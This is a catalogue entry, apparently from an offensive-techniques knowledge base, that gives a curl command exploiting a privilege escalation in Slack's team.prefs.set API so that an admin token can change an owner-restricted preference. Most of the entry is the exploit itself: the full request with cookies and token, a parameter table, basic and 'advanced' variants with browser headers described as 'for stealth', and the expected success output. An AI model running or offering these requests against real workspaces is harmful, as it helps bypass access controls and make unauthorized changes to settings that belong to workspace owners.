---
id: 123e4567-e89b-12d3-a456-426614174002
name: slack-set-team-prefs-post
type: command
executor: bash
data: >-
  curl -X POST
  "https://satishb3mailinator.slack.com/api/team.prefs.set?t=1423143830" -H
  "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0)
  Gecko/20100101 Firefox/34.0" -H "Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:
  https://satishb3mailinator.slack.com/admin/settings" -H "Cookie:
  _ga=GA1.2.630936366.1423056192; a-3204538285=..." -d
  "prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.682Z'
platforms:
  - Web
tags:
  - api
  - privilege-escalation
  - slack
verified: false
validated: true
submitted: true
---

# slack-set-team-prefs-post

## Command

```bash
curl -X POST "https://satishb3mailinator.slack.com/api/team.prefs.set?t=1423143830" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: https://satishb3mailinator.slack.com/admin/settings" -H "Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..." -d "prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1"
```

## Description

This command sends a POST request to Slack's /api/team.prefs.set endpoint to modify the 'require_at_for_mention' team preference to true using a team admin token, exploiting a privilege escalation vulnerability. Use it to demonstrate unauthorized changes to owner-restricted settings.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `t` | Timestamp parameter for request freshness (e.g., 1423143830) | Yes |
| `prefs` | URL-encoded JSON object setting preferences (e.g., %7B%22require_at_for_mention%22%3Atrue%7D) | Yes |
| `token` | Slack authentication token (e.g., xoxs-xxxxx) | Yes |
| `set_active` | Flag to activate the setting (true) | Yes |
| `_attempts` | Request attempt counter (1) | Yes |
| Host/URL | Target Slack workspace API (e.g., https://workspace.slack.com/api/team.prefs.set) | Yes |
| Headers | User-Agent, Content-Type, Referer, Cookie for mimicking browser request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://workspace.slack.com/api/team.prefs.set?t=$(date +%s)" -H "Content-Type: application/x-www-form-urlencoded" -d "prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=your-token&set_active=true"
```

### Advanced Usage

Include full headers and cookies for stealth:

```bash
curl -X POST "https://workspace.slack.com/api/team.prefs.set?t=1423143830" \
  -H "User-Agent: Mozilla/5.0 ..." \
  -H "Cookie: ..." \
  -d "prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1"
```

## Expected Output

Successful execution returns a JSON response like {"ok":true,"prefs":{"require_at_for_mention":true}}, indicating the team setting has been modified. Errors may show {"ok":false,"error":"invalid_auth"} if token is invalid.

## Related

- [[Related Procedure|procedures/Exploit-Slack-Team-Prefs-API-Privilege-Escalation]]
